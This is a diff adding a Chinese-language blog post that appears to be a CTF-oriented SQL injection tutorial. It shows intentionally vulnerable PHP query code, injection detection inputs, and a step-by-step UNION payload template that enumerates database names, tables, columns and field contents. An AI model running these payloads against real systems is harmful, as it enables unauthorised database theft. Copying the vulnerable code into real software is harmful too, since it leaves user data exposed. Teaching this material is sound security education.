@@ -1,0 +1,590 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Nayst"><meta name="copyright" content="Nayst"><meta name="generator" content="Hexo 6.2.0"><meta name="theme" content="hexo-theme-yun"><title>深入了解sql注入 | Nayst-blog</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.3.3/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/@unocss/runtime/mini.global.js"></script><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
+  [".post-card",".markdown-body img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+}
+document.addEventListener("DOMContentLoaded", initScrollReveal);
+document.addEventListener("pjax:success", initScrollReveal);
+</script><link rel="icon" type="image/svg+xml" href="/images/Doge.svg"><link rel="mask-icon" href="/images/Doge.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
+    window.Yun = {}
+    window.CONFIG = {"hostname":"n4yst.github.io","root":"/","title":["Nayst","的","小","站"],"version":"1.10.3","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"fireworks":{"colors":null},"vendors":{"darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
+  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><meta name="description" content="前言注入漏洞在web前十漏洞中位居榜首，其中SQL注入最为经典。 SQL注入什么是SQL注入SQL注入漏洞是指攻击者通过浏览器或者其他客户端将恶意SQL语句插入到网站参数中，而网站应用程序未对其进行过滤，将恶意SQL语句带入数据库使恶意SQL语句得以执行，从而使攻击者通过数据库获取敏感信息或者执行其他恶意操作。 SQL注入漏洞可能会导致服务器的数据库信息泄露、数据被窃取、网页被篡改，甚至可能会造成">
+<meta property="og:type" content="article">
+<meta property="og:title" content="深入了解sql注入">
+<meta property="og:url" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="Nayst-blog">
+<meta property="og:description" content="前言注入漏洞在web前十漏洞中位居榜首，其中SQL注入最为经典。 SQL注入什么是SQL注入SQL注入漏洞是指攻击者通过浏览器或者其他客户端将恶意SQL语句插入到网站参数中，而网站应用程序未对其进行过滤，将恶意SQL语句带入数据库使恶意SQL语句得以执行，从而使攻击者通过数据库获取敏感信息或者执行其他恶意操作。 SQL注入漏洞可能会导致服务器的数据库信息泄露、数据被窃取、网页被篡改，甚至可能会造成">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://n4yst.github.io/SQL%E6%B3%A8%E5%85%A5/image-20210724161433506.png">
+<meta property="og:image" content="http://n4yst.github.io/SQL%E6%B3%A8%E5%85%A5/image-20210724160925428.png">
+<meta property="og:image" content="http://n4yst.github.io/SQL%E6%B3%A8%E5%85%A5/image-20210724183800027.png">
+<meta property="og:image" content="http://n4yst.github.io/SQL%E6%B3%A8%E5%85%A5/image-20210724184056134.png">
+<meta property="og:image" content="http://n4yst.github.io/SQL%E6%B3%A8%E5%85%A5/image-20210724184131894.png">
+<meta property="og:image" content="http://n4yst.github.io/SQL%E6%B3%A8%E5%85%A5/image-20210724184513617.png">
+<meta property="og:image" content="http://n4yst.github.io/SQL%E6%B3%A8%E5%85%A5/image-20210724221449012.png">
+<meta property="og:image" content="http://n4yst.github.io/SQL%E6%B3%A8%E5%85%A5/image-20210724221612834.png">
+<meta property="og:image" content="http://n4yst.github.io/SQL%E6%B3%A8%E5%85%A5/image-20210724224135261.png">
+<meta property="og:image" content="http://n4yst.github.io/SQL%E6%B3%A8%E5%85%A5/image-20210724230714048.png">
+<meta property="og:image" content="http://n4yst.github.io/SQL%E6%B3%A8%E5%85%A5/image-20210724232103948.png">
+<meta property="og:image" content="http://n4yst.github.io/SQL%E6%B3%A8%E5%85%A5/image-20210725110316413.png">
+<meta property="og:image" content="http://n4yst.github.io/SQL%E6%B3%A8%E5%85%A5/image-20210725111053307.png">
+<meta property="og:image" content="http://n4yst.github.io/SQL%E6%B3%A8%E5%85%A5/image-20210725111329442.png">
+<meta property="og:image" content="http://n4yst.github.io/SQL%E6%B3%A8%E5%85%A5/image-20210725111528458.png">
+<meta property="og:image" content="http://n4yst.github.io/SQL%E6%B3%A8%E5%85%A5/image-20210725144530805.png">
+<meta property="og:image" content="http://n4yst.github.io/SQL%E6%B3%A8%E5%85%A5/image-20210725145257615.png">
+<meta property="og:image" content="http://n4yst.github.io/SQL%E6%B3%A8%E5%85%A5/image-20210725145450328.png">
+<meta property="og:image" content="http://n4yst.github.io/SQL%E6%B3%A8%E5%85%A5/image-20210725150025086.png">
+<meta property="og:image" content="http://n4yst.github.io/SQL%E6%B3%A8%E5%85%A5/image-20210726125323913.png">
+<meta property="og:image" content="http://n4yst.github.io/SQL%E6%B3%A8%E5%85%A5/image-20210726125809221.png">
+<meta property="og:image" content="http://n4yst.github.io/SQL%E6%B3%A8%E5%85%A5/image-20210726125830823.png">
+<meta property="og:image" content="http://n4yst.github.io/SQL%E6%B3%A8%E5%85%A5/image-20210726125908271.png">
+<meta property="og:image" content="http://n4yst.github.io/SQL%E6%B3%A8%E5%85%A5/image-20210726130541927.png">
+<meta property="og:image" content="http://n4yst.github.io/SQL%E6%B3%A8%E5%85%A5/image-20210726131604921.png">
+<meta property="og:image" content="http://n4yst.github.io/SQL%E6%B3%A8%E5%85%A5/image-20210726131919320.png">
+<meta property="og:image" content="http://n4yst.github.io/SQL%E6%B3%A8%E5%85%A5/image-20210726145309481.png">
+<meta property="og:image" content="http://n4yst.github.io/SQL%E6%B3%A8%E5%85%A5/image-20210726150609315.png">
+<meta property="og:image" content="http://n4yst.github.io/SQL%E6%B3%A8%E5%85%A5/image-20210726153906638.png">
+<meta property="og:image" content="http://n4yst.github.io/SQL%E6%B3%A8%E5%85%A5/image-20210726154407760.png">
+<meta property="og:image" content="http://n4yst.github.io/SQL%E6%B3%A8%E5%85%A5/image-20210726154551164.png">
+<meta property="article:published_time" content="2021-08-30T07:20:42.000Z">
+<meta property="article:modified_time" content="2022-05-01T09:32:13.576Z">
+<meta property="article:author" content="Nayst">
+<meta property="article:tag" content="web漏洞">
+<meta property="article:tag" content="mysql">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://n4yst.github.io/SQL%E6%B3%A8%E5%85%A5/image-20210724161433506.png"><script>(function() {
+  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
+  const setting = localStorage.getItem('darken-mode') || 'auto'
+  if (setting === 'dark' || (prefersDark && setting !== 'light'))
+    document.documentElement.classList.toggle('dark', true)
+})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
+IconifyProviders = {
+  // Empty prefix: overwrite default API provider configuration
+  '': {
+    // Use custom API first, use Iconify public API as backup
+    resources: [
+        'https://api.iconify.design',
+    ],
+    // Wait for 1 second before switching API hosts
+    rotate: 1000,
+  },
+};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info mickey-mouse"><a class="site-author-avatar" href="/about/" title="Nayst"><img width="96" loading="lazy" src="/images/kakashi.png" alt="Nayst"><span class="site-author-status" title="永远相信美好的事情即将发生">😊</span></a><div class="site-author-name"><a href="/about/">Nayst</a></div><span class="site-name">Nayst-blog</span><sub class="site-subtitle">努力追赶师傅们的一只菜鸡</sub><div class="site-description"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">26</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">4</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">8</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" title="RSS" target="_blank" style="color:orange"><span class="icon iconify" data-icon="ri:rss-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/N4YST" title="GitHub" target="_blank" style="color:#181717"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" title="QQ 2495582918" target="_blank" style="color:#12B7F5"><span class="icon iconify" data-icon="ri:qq-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" title="wechat y1049843745" target="_blank" style="color:#1AAD19"><span class="icon iconify" data-icon="ri:wechat-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:2495582918@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:mail-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:men-line"></span></a><a class="links-item hty-icon-button" href="/girls/" title="我的老婆们" style="color:pink"><span class="icon iconify" data-icon="ri:women-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFSQL%E6%B3%A8%E5%85%A5"><span class="toc-number">2.1.</span> <span class="toc-text">什么是SQL注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-number">2.2.</span> <span class="toc-text">注入类型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.1.</span> <span class="toc-text">数字型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.2.</span> <span class="toc-text">字符型注入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MySQL%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">MySQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-number">3.1.</span> <span class="toc-text">联合查询注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload%E6%A8%A1%E6%9D%BF%E4%B8%8E%E6%AD%A5%E9%AA%A4"><span class="toc-number">3.1.1.</span> <span class="toc-text">payload模板与步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-number">3.1.2.</span> <span class="toc-text">注意事项</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bool%E7%9B%B2%E6%B3%A8"><span class="toc-number">3.2.</span> <span class="toc-text">bool盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload%E6%A8%A1%E6%9D%BF%E4%B8%8E%E6%AD%A5%E9%AA%A4-1"><span class="toc-number">3.2.1.</span> <span class="toc-text">payload模板与步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9-1"><span class="toc-number">3.2.2.</span> <span class="toc-text">注意事项</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">3.3.</span> <span class="toc-text">时间盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload%E6%A8%A1%E6%9D%BF%E4%B8%8E%E6%AD%A5%E9%AA%A4-2"><span class="toc-number">3.3.1.</span> <span class="toc-text">payload模板与步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9-2"><span class="toc-number">3.3.2.</span> <span class="toc-text">注意事项</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-floor"><span class="toc-number">3.4.</span> <span class="toc-text">报错注入-floor</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload%E6%A8%A1%E6%9D%BF%E4%B8%8E%E6%AD%A5%E9%AA%A4-3"><span class="toc-number">3.4.1.</span> <span class="toc-text">payload模板与步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9-3"><span class="toc-number">3.4.2.</span> <span class="toc-text">注意事项</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-updatexml"><span class="toc-number">3.5.</span> <span class="toc-text">报错注入-updatexml</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload%E6%A8%A1%E6%9D%BF%E4%B8%8E%E6%AD%A5%E9%AA%A4-4"><span class="toc-number">3.5.1.</span> <span class="toc-text">payload模板与步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9-4"><span class="toc-number">3.5.2.</span> <span class="toc-text">注意事项</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-extractvalue"><span class="toc-number">3.6.</span> <span class="toc-text">报错注入-extractvalue</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload%E6%A8%A1%E6%9D%BF%E4%B8%8E%E6%AD%A5%E9%AA%A4-5"><span class="toc-number">3.6.1.</span> <span class="toc-text">payload模板与步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9-5"><span class="toc-number">3.6.2.</span> <span class="toc-text">注意事项</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">3.7.</span> <span class="toc-text">宽字节注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload%E6%A8%A1%E6%9D%BF%E4%B8%8E%E6%AD%A5%E9%AA%A4-6"><span class="toc-number">3.7.1.</span> <span class="toc-text">payload模板与步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9-6"><span class="toc-number">3.7.2.</span> <span class="toc-text">注意事项</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87"><span class="toc-number">3.8.</span> <span class="toc-text">SQL注入绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="toc-number">3.8.1.</span> <span class="toc-text">空格绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E8%81%94%E6%B3%A8%E9%87%8A%E7%BB%95%E8%BF%87"><span class="toc-number">3.8.2.</span> <span class="toc-text">内联注释绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">3.8.3.</span> <span class="toc-text">大小写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8C%E5%86%99%E5%85%B3%E9%94%AE%E8%AF%8D%E7%BB%95%E8%BF%87"><span class="toc-number">3.8.4.</span> <span class="toc-text">双写关键词绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">3.8.5.</span> <span class="toc-text">编码绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%89%E4%BB%B7%E5%87%BD%E6%95%B0%E5%AD%97%E7%AC%A6%E6%9B%BF%E6%8D%A2%E7%BB%95%E8%BF%87"><span class="toc-number">3.8.6.</span> <span class="toc-text">等价函数字符替换绕过</span></a></li></ol></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="http://N4YST.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Nayst"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Nayst-blog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">深入了解sql注入</h1><div class="post-meta"><div class="post-time"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <span class="post-meta-icon-text">发表于</span> <time title="创建时间：2021-08-30 15:20:42" itemprop="dateCreated datePublished" datetime="2021-08-30T15:20:42+08:00">2021-08-30</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <span class="post-meta-icon-text">更新于</span> <time title="修改时间：2022-05-01 17:32:13" itemprop="dateModified" datetime="2022-05-01T17:32:13+08:00">2022-05-01</time></div><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/web%E5%AE%89%E5%85%A8/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">web安全</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/web%E6%BC%8F%E6%B4%9E/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">web漏洞</span></a><a class="tag-item" href="/tags/mysql/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">mysql</span></a><a class="tag-item" href="/tags/ctf/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">ctf</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>注入漏洞</strong>在web前十漏洞中位居榜首，其中SQL注入最为经典。</p>
+<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="什么是SQL注入"><a href="#什么是SQL注入" class="headerlink" title="什么是SQL注入"></a>什么是SQL注入</h2><p>SQL注入漏洞是指攻击者通过浏览器或者其他客户端将恶意SQL语句插入到网站参数中，而网站应用程序未对其进行过滤，将恶意SQL语句带入数据库使恶意SQL语句得以执行，从而使攻击者通过数据库获取敏感信息或者执行其他恶意操作。</p>
+<p>SQL注入漏洞可能会导致服务器的数据库信息泄露、数据被窃取、网页被篡改，甚至可能会造成网站被挂马、服务器被远程控制、被上后门等。</p>
+<ul>
+<li>以下是SQL注入漏洞的示例代码</li>
+</ul>
+<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">...
+$id &#x3D; $_GET[&#39;id&#39;];
+$sql &#x3D; &quot;SELECT * FROM users WHERE id &#x3D; $id LIMIT 0,1&quot;;
+$result &#x3D; mysql_query($sql);
+$row &#x3D; mysql_fetch_array($result);
+...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>中间件通过GET传入用户指定的<code>id</code>参数，并赋值给<code>$id</code>变量，<code>$id</code>在后面没有任何过滤，直接拼接到SQL语句中，然后在数据库中执行了此SQL语句。</p>
+<h2 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h2><p>SQL注入按数据类型分为数字型注入和字符型注入</p>
+<h3 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h3><p>数字型注入就是注入点的数据类型为数字型，<strong>没有</strong>用单引号或者双引号括起来。</p>
+<p>典型代码示例</p>
+<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">...
+$id &#x3D; $_GET[&#39;id&#39;];
+$sql &#x3D; &quot;SELECT * FROM users WHERE id &#x3D; $id LIMIT 0,1&quot;;
+$result &#x3D; mysql_query($sql);
+$row &#x3D; mysql_fetch_array($result);
+...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>判断方法：</p>
+<ol>
+<li>输入单引号时，不正常返回</li>
+</ol>
+<p>用户提交<code>index.php?id=1&#39;</code>时，单个的单引号没有闭合，产生了语法错误，不正常返回。</p>
+<ol start="2">
+<li>输入<code> and 1=1</code>，正常返回</li>
+</ol>
+<p>用户提交<code>index.php?id=1 and 1=1</code>时，语句拼接后查询成功，正常返回。</p>
+<ol start="3">
+<li>输入<code> and 1=2</code>，不正常返回</li>
+</ol>
+<p>用户提交<code>index.php?id=1 and 1=2</code>时，<code>1=2</code>为<code>false</code>，查询失败，不正常返回。</p>
+<h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><p>字符型注入就是注入点的数据类型为字符型，<strong>有用</strong>单引号或者双引号括起来。</p>
+<p>典型代码示例</p>
+<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">...
+$id &#x3D; $_GET[&#39;id&#39;];
+$sql &#x3D; &quot;SELECT * FROM users WHERE id &#x3D; &#39;$id&#39; LIMIT 0,1&quot;;
+$result &#x3D; mysql_query($sql);
+$row &#x3D; mysql_fetch_array($result);
+...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>判断方法</p>
+<ol>
+<li>输入单引号，不正常返回</li>
+</ol>
+<p>用户提交<code>index.php?id=1&#39;</code>时，拼接的SQL语句变成了<code>SELECT * FROM users WHERE id = &#39;1&#39;&#39; LIMIT 0,1</code>单引号没有闭合，产生了语法错误，不正常返回。</p>
+<ol start="2">
+<li>输入<code> &#39;and &#39;1&#39;=&#39;1</code>，正常返回</li>
+</ol>
+<p>用户提交<code>&#39;and &#39;1&#39;=&#39;1</code>时，拼接的SQL语句变成了<code>SELECT * FROM users WHERE id = &#39;1&#39; and &#39;1&#39;=&#39;1&#39; LIMIT 0,1</code>，查询成功，正常返回。</p>
+<ol start="3">
+<li>输入<code> &#39;and &#39;1&#39;=&#39;2</code>，不正常返回</li>
+</ol>
+<p>用户提交<code>&#39;and &#39;1&#39;=&#39;2</code>时，拼接的SQL语句变成了<code>SELECT * FROM users WHERE id = &#39;1&#39; and &#39;1&#39;=&#39;2&#39; LIMIT 0,1</code>，<code>&#39;1&#39;=&#39;2&#39;</code>为<code>false</code>，查询失败，不正常返回。</p>
+<h1 id="MySQL注入"><a href="#MySQL注入" class="headerlink" title="MySQL注入"></a>MySQL注入</h1><p>MySQL数据库是一种开源的关系型数据库查询系统，是使用量最高的一种数据库管理系统，这里将以MySQL为例子讲解常见的几种注入方式。</p>
+<h2 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h2><p>利用MySQL中<code>UNION</code>关键词可以同时执行多条SQL语句的特点，在参数中插入恶意的SQL注入语句，执行额外的SQL语句，获取额外敏感信息或者执行其他数据库操作。</p>
+<h3 id="payload模板与步骤"><a href="#payload模板与步骤" class="headerlink" title="payload模板与步骤"></a>payload模板与步骤</h3><ol>
+<li>判断注入点</li>
+</ol>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">id&#x3D;1 and 1&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ol start="2">
+<li>判断列数</li>
+</ol>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">id&#x3D;1 order by 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ol start="3">
+<li>判断报错点</li>
+</ol>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">id&#x3D;1 and 1&#x3D;2 union select 1,2,3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ol start="4">
+<li>查当前库名</li>
+</ol>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">id&#x3D;1 and 1&#x3D;2 union select database()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">id&#x3D;1 and 1&#x3D;2 union select CONCAT_WS(CHAR(32,58,32),user(),database(),version())<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ol start="5">
+<li>查表名</li>
+</ol>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">id&#x3D;1 and 1&#x3D;2 union select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() limit 0,1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ol start="6">
+<li>查列名</li>
+</ol>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">id&#x3D;1 and 1&#x3D;2 union select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;表名&#39; limit 0,1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ol start="7">
+<li>查字段</li>
+</ol>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">id&#x3D;1 and 1&#x3D;2 union select group_concat(列名，列名···) from 库名 limit 0,1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ol>
+<li>union用于合并多个select语句的结果，并默认去重</li>
+</ol>
+<p><img src="/SQL%E6%B3%A8%E5%85%A5/image-20210724161433506.png" alt="image-20210724161433506" loading="lazy"></p>
+<ol start="2">
+<li>联合查询中合并的选择查询必须具相同的输出字段数，采用相同的顺序，并包含相同或兼容的数据类型</li>
+</ol>
+<p><img src="/SQL%E6%B3%A8%E5%85%A5/image-20210724160925428.png" alt="image-20210724160925428" loading="lazy"></p>
+<h2 id="bool盲注"><a href="#bool盲注" class="headerlink" title="bool盲注"></a>bool盲注</h2><p>与报错注入不同，bool盲注没有任何的报错信息输出，页面只有正常和不正常两种状态，攻击者只能通过返回的两个状态来判断输入的SQL语句是否正确，从而判断数据库中储存了哪些信息。</p>
